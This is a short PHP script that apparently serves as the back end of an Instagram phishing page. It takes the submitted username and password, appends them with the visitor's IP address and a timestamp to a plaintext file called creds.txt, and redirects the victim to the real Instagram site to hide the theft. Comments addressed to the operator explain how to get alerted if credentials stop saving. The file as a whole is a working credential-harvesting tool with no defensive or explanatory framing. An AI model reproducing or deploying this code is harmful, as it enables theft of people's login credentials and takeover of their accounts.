<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");
$file = fopen("creds.txt", "a");

if ($file) {
  fwrite($file, "Username: " . $username . "\n");
  fwrite($file, "Password: " . $password . "\n");
  fwrite($file, "IP Address: " . $ip . "\n");
  fwrite($file, "Date: " . $date . "\n\n");
  fclose($file);
} else {
  // Log an error to a separate file or email you, so you know the credentials are not saving.
  error_log("Failed to open creds.txt for writing", 0); // You can also email the error to yourself.
  // You can also show an error to the user.
  // echo "Error: Could not save your credentials. Please try again later.";
}

header('Location: https://www.instagram.com/');
exit;
?>
